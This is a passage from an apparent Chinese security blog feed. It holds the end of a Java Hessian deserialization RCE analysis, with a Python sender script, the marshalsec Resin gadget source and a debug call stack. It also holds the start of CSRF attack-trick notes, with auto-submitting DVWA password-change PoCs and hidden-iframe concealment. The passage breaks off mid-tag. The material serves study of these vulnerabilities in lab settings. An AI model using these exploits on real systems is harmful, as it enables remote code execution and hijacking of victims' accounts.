class="line">    <span class="keyword">with</span> open(name,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> header+f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(url,payload)</span>:</span></span><br><span class="line">    <span class="comment">#proxies = &#123;'http':'127.0.0.1:8888'&#125;</span></span><br><span class="line">    headers=&#123;<span class="string">'Content-Type'</span>:<span class="string">'x-application/hessian'</span>&#125;</span><br><span class="line">    data=payload</span><br><span class="line">    res=requests.post(url,headers=headers,data=data)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"-u"</span>, help=<span class="string">"hessian site url eg.http://127.0.0.1:8080/HessianTest/hessian"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-p"</span>,help=<span class="string">"payload file"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.u==<span class="keyword">None</span> <span class="keyword">or</span> args.p==<span class="keyword">None</span>:</span><br><span class="line">        print(<span class="string">'eg. python hessian.py -u http://127.0.0.1:8080/HessianTest/hessian -p hessian'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        send(args.u, load(args.p))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="comment">#load('hessian')</span></span><br></pre></td></tr></table></figure><p>先是将marshalsec生成的payload和构造的header拼接成Hessian格式的序列化内容，然后通过POST方式发送该Hessian序列化的内容，其中需要指定Content-Type头为’x-application/hessian’让服务端识别出事Hessian序列化类型的数据。</p><p>运行脚本，成功触发反序列化漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python hessian.py -u http://127.0.0.1:8080/HessianTest/hessian -p hessian</span><br></pre></td></tr></table></figure><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/2.png" alt=""></p><h3 id="Resin-Gadget分析"><a href="#Resin-Gadget分析" class="headerlink" title="Resin Gadget分析"></a>Resin Gadget分析</h3><p>调试分析之前，我们需要知道marshalsec中Resin Gadget到底是如何触发反序列化漏洞RCE的。</p><p>我们看下Gadget怎么写的：<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/Resin.java" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/Resin.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> marshalsec.gadgets;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> marshalsec.MarshallerBase;</span><br><span class="line"><span class="keyword">import</span> marshalsec.UtilFactory;</span><br><span class="line"><span class="keyword">import</span> marshalsec.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Resin</span> <span class="keyword">extends</span> <span class="title">Gadget</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Args</span> ( minArgs = <span class="number">2</span>, args = &#123;</span><br><span class="line">        <span class="string">"codebase"</span>, <span class="string">"class"</span></span><br><span class="line">    &#125;, defaultArgs = &#123;</span><br><span class="line">        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass</span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="function"><span class="keyword">default</span> Object <span class="title">makeResinQName</span> <span class="params">( UtilFactory uf, String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(<span class="string">"javax.naming.spi.ContinuationDirContext"</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        ccCons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        CannotProceedException cpe = <span class="keyword">new</span> CannotProceedException();</span><br><span class="line">        Reflections.setFieldValue(cpe, <span class="string">"cause"</span>, <span class="keyword">null</span>);</span><br><span class="line">        Reflections.setFieldValue(cpe, <span class="string">"stackTrace"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        cpe.setResolvedObj(<span class="keyword">new</span> Reference(<span class="string">"Foo"</span>, args[ <span class="number">1</span> ], args[ <span class="number">0</span> ]));</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(cpe, <span class="string">"suppressedExceptions"</span>, <span class="keyword">null</span>);</span><br><span class="line">        DirContext ctx = (DirContext) ccCons.newInstance(cpe, <span class="keyword">new</span> Hashtable&lt;&gt;());</span><br><span class="line">        QName qName = <span class="keyword">new</span> QName(ctx, <span class="string">"foo"</span>, <span class="string">"bar"</span>);</span><br><span class="line">        <span class="keyword">return</span> uf.makeToStringTriggerStable(qName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可知：</p><ol><li>先定义了javax.naming.spi.ContinuationDirContext类实例，然后调用getDeclaredConstructor()函数生成CannotProceedException类和Hashtable类的结构体实例，用于构造后面的DirContext类实例并通过构造函数赋值给QName类实例的<code>_context</code>属性。</li><li>然后定义了一个CannotProceedException类变量cpe，该类用于程序出现异常时通过调用javax.naming.spi.NamingManager提供的方法（比如 getContinuationContext()）来查找另一个提供程序以继续操作；这里调用了setResolvedObj()函数设置此异常的已解析对象字段为恶意的Reference类实例，可以看到是Reference()的classFactoryLocation参数的JNDI注入利用，注意该Reference最后是传入到QName构造函数的第一个参数中。</li><li>接着，将设置好的cpe传入DirContext的newInstance()函数中新建实例。</li><li>最后定义了com.caucho.naming.QName这个类实例，再调用makeToStringTriggerStable()函数处理该对象并返回。</li></ol><p>接着跟踪makeToStringTriggerStable()函数的实现，根本是调用的ToStringUtil.makeToStringTrigger()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">makeToStringTrigger</span> <span class="params">( Object o )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String unhash = unhash(o.hashCode());</span><br><span class="line">    XString xString = <span class="keyword">new</span> XString(unhash);</span><br><span class="line">    <span class="keyword">return</span> JDKUtil.makeMap(o, xString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可知，用到了com.sun.org.apache.xpath.internal.objects.XString这个类来和QName对象生成并返回一个Map对象。使用这个处理的目的是为了调用到QName.toString()函数。</p><p>最后我们看下com.caucho.naming.QName类的toString()函数：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/15.png" alt=""></p><p>在toString()函数中，QName类的<code>_context</code>属性调用了composeName()函数。我们Gadget打进去后该属性类型为ContinuationDirContext，其中的cpe为CannotProceedException类实例，在调用到此处时会触发NamingException异常，此时会调用javax.naming.spi.NamingManager.getObjectFactoryFromReference()函数去加载Reference指定地址的服务，最后就是lookup()，从而导致RCE。</p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>这里使用IDEA对Tomcat的war包进行远程调试。</p><p>由于在Windows本地运行的Tomcat，因此打开Tomcat的配置文件catalina.bat添加如下配置再重启Tomcat即可开启远程调试的端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set CATALINA_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5555&quot;</span><br></pre></td></tr></table></figure><p>接着本地解压war包并用IDEA打开，然后使用Remote远程连接到Tomcat后，当显示”Connected to the target VM, address: ‘localhost:5555’, transport: ‘socket’”时表示成功，即可开始远程调试。</p><p>我们从配置文件web.xml开始看，这里有个URL的匹配路径/hessian，也就是刚刚我们访问的那个接口，可以看到其对应的是HessianServlet这个类：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/4.png" alt=""></p><p>跟进该类，直接在service()函数中下断点，然后浏览器再次访问<code>http://127.0.0.1:8080/HessianTest/hessian</code>页面即可停在断点处：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/5.png" alt=""></p><p>可以看到，这个接口需要POST方式来传数据，否则直接返回500。</p><p>重新发送payload，往下调试，看到会获取request请求中的输入流，然后调用invoke()函数：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/6.png" alt=""></p><p>跟下去，在invoke()函数中会调用相关函数读取头类型，并在下面的switch语句中匹配符合条件的头类型进入不同的逻辑，这里获取到的头类型是<code>CALL_1_REPLY_2</code>，则调用createHessianInput()函数创建Hessian输入流和输出流：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/7.png" alt=""></p><p>接着会判断序列化器工厂是否为空，这里为非空则设置到Hessian的输入流和输出流，然后调用invoke()：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/8.png" alt=""></p><p>跟进去这个invoke()函数，这里循环遍历读入header头，若header存在则调用Hessian输入流的readObject()，这里读取到了python脚本构造的名为test的Hessian头：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/9.png" alt=""></p><p>跟进去HessianInput.readObject()函数中，其中先获取tag值为77即’M’，然后匹配到对应的switch语句中调用readMap()函数：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/10.png" alt=""></p><p>跟进SerializerFactory.readMap()函数中，由于type为空且已经存在HashMap反序列化器，因此会调用MapDeserializer的readMap()函数继续解析序列化的Map内容：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/11.png" alt=""></p><p>跟进去MapDeserializer.readMap()函数，先新建一个HashMap实例，然后循环遍历HessianInput的内容，将其中的键值都进行readObject()操作然后再put进该新建的HashMap实例中：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/12.png" alt=""></p><p>这里readObject()处理过程也是一样的，简单地说就是获取序列化内容的类类型、属性值等（这里为反序列化获取com.caucho.naming.QName类及其属性值等，具体过程可自行调试下）。此处下断点然后F8过两次就能直接触发弹计算器了。</p><p>HashMap.put()函数中会调用hash(key)来计算对象的hash，然后再调用putVal()来设置HashMap的值：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/13.png" alt=""></p><p>这里hash(key)实际上就是调用的QName的hashCode()，在我本地调试的时候就出触发一次弹计算器（其实在获取了QName的<code>_items</code>属性后，只要在本地调试调用到QName的函数都会弹计算器，原因应该就是QName的<code>_context</code>属性中的cpe是个CannotProceedException类，会一直触发异常导致提前RCE）：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/14.png" alt=""></p><p>在第二次调用到HashMap.put()函数时，此时调用了XString的equals()函数：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/19.png" alt=""></p><p>在XString.equals()函数中，调用了QName.toString()函数：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/20.png" alt=""></p><p>调用到QName.toString()函数，这里才是真正的漏洞触发点，我们由前面知道marshalsec工具的Resin Gadget中QName类对象的<code>_context</code>属性的cpe是被设置为CannotProceedException类，该属性在调用composeName()函数时会捕获到NamingException异常，此时会调用javax.naming.spi.NamingManager的getContext()函数来查找另一个提供程序即恶意Reference来继续执行操作，从而触发RCE：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/21.png" alt=""></p><p>此时我们打开看下NamingException类实例即变量e中的stackTrace，验证了前面的分析，即QName.toString()中的漏洞点是在composeName()调用中，这里由于NamingException异常导致调用了NamingManager.getContext()来查找另一个程序继续执行，这其中有调用了NamingManager.getObjectFactoryFromReference()函数来加载payload中设置的恶意Reference地址指向的服务上的类，从而导致RCE：</p><p><img src="/2020/01/25/Java-Hessian反序列化漏洞/22.png" alt=""></p><p>此时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">toString:346, QName (com.caucho.naming)</span><br><span class="line">equals:392, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">putVal:634, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readMap:114, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:573, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:1160, HessianInput (com.caucho.hessian.io)</span><br><span class="line">invoke:240, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">invoke:198, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">invoke:425, HessianServlet (com.caucho.hessian.server)</span><br><span class="line">service:405, HessianServlet (com.caucho.hessian.server)</span><br><span class="line">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:52, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:199, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:139, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:678, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:87, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:609, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:810, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1623, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.freebuf.com/vuls/224280.html" target="_blank" rel="noopener">Hessian反序列化RCE漏洞复现及分析</a></p><p><a href="https://mp.weixin.qq.com/s/vW6IgaA_Imc7-_Bac9XNQg" target="_blank" rel="noopener">SOFA-Hessian反序列漏洞</a></p><p><a href="https://docs.ioin.in/writeup/blog.csdn.net/_u011721501_article_details_79443598/index.html" target="_blank" rel="noopener">Java Unmarshalling Security - 攻击Hessian协议</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CSRF Tricks小结</title>
    <link href="https://www.mi1k7ea.com/2020/01/21/CSRF-Tricks%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/01/21/CSRF-Tricks小结/</id>
    <published>2020-01-21T09:49:15.000Z</published>
    <updated>2020-01-25T00:49:14.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-废话"><a href="#0x00-废话" class="headerlink" title="0x00 废话"></a>0x00 废话</h2><p>这里对CSRF漏洞的攻击利用技巧做了笔记小结，不定时补充。</p><h2 id="0x01-CSRF并非必须点击才能攻击"><a href="#0x01-CSRF并非必须点击才能攻击" class="headerlink" title="0x01 CSRF并非必须点击才能攻击"></a>0x01 CSRF并非必须点击才能攻击</h2><p>常规的CSRF的PoC如下，以DVWA的为例，通常是新建一个a标签让受害者点击：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#'</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而以BP生成的PoC则是用GET或POST的方式来提交表单，同样是需要受害者来点击提交的这个按钮才能触发CSRF攻击的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://172.26.224.239/DVWA/vulnerabilities/captcha/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;new"</span> <span class="attr">value</span>=<span class="string">"123456"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;conf"</span> <span class="attr">value</span>=<span class="string">"123456"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其实可以跳过用户点击按钮来触发CSRF攻击的这个步骤，只需要用户被诱使访问了恶意页面即可。当然，这种方法就是通过JavaScript来实现的。</p><p>a标签用的是click()方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://192.168.10.132/dvwa/vulnerabilities/csrf/?password_new=mi1k7ea&amp;password_conf=mi1k7ea&amp;Change=Change#'</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- JS实现自动点击 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">  m.click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>form表单用的是submit()方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.10.132/dvwa/vulnerabilities/csrf/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;new"</span> <span class="attr">value</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;conf"</span> <span class="attr">value</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- JS实现自动点击 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'form'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">    m.submit();</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-利用iframe隐藏攻击过程"><a href="#0x02-利用iframe隐藏攻击过程" class="headerlink" title="0x02 利用iframe隐藏攻击过程"></a>0x02 利用iframe隐藏攻击过程</h2><p>一般的，CSRF攻击成功后就会自动跳转到已被CSRF攻击的目标页面中，此时容易被受害者发现。此时可以利用iframe标签来引入CSRF攻击页面，让CSRF攻击过程都不直接在页面中显现，一切都隐藏在页面中悄悄进行，不易被受害者发现。</p><p>隐藏iframe框可以使用HTML5的hidden属性或直接用iframe的height和width属性：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"csrf.html"</span> <span class="attr">hidden</span>=<span class="string">"hidden"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">或</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"csrf.html"</span> <span class="attr">height</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"0"</span>&gt;</span>hi<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-CSRF并非必需浏览器才能攻击"><a href="#0x03-CSRF并非必需浏览器才能攻击" class="headerlink" title="0x03 CSRF并非必需浏览器才能攻击"></a>0x03 CSRF并非必需浏览器才能攻击</h2><p>一般针对Web服务的CSRF攻击，都是通过浏览器发起的，这是因为诱使受害者在浏览器中访问恶意页面时，浏览器会自动将已有的已登录站点的cookie自动带上去访问恶意页面中发起的表单请求。</p><p>但是CSRF并非只能通过浏览器这个媒介发起攻击的，它可利用自解压文件内的JavaScript等来攻击（当然，这是需要保存自本地的cookie才能成功）。</p><h2 id="0x04-GET型CSRF利用方式多样化"><a href="#0x04-GET型CSRF利用方式多样化" class="headerlink" title="0x04 GET型CSRF利用方式多样化"></a>0x04 GET型CSRF利用方式多样化</h2><p>我们稍微观察下BP生成的CSRF PoC会发现，无论是GET或POST都是表单的形式来发起攻击的。POST没话说，必须得是表单才能提交数据。但GET就不一定了，它可以通过其他的一些标签或属性来发起CSRF攻击。</p><p>可利用的方式如下：</p><ul><li><code>&lt;a&gt;</code>标签</li><li><code>&lt;img&gt;</code>标签</li><li><code>&lt;script&gt;</code>标签</li><li><code>&lt;iframe&gt;</code>标签</li><li><code>&lt;link&gt;</code>标签</li><li>CSS方法</li><li>JavaScript方法：Image对象、XMLHTTP对象</li></ul><p>如前面BP生成的GET型CSRF攻击表单：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://172.26.224.239/DVWA/vulnerabilities/captcha/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;new"</span> <span class="attr">value</span>=<span class="string">"123456"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;conf"</span> <span class="attr">value</span>=<span class="string">"123456"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>a标签，如前面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span 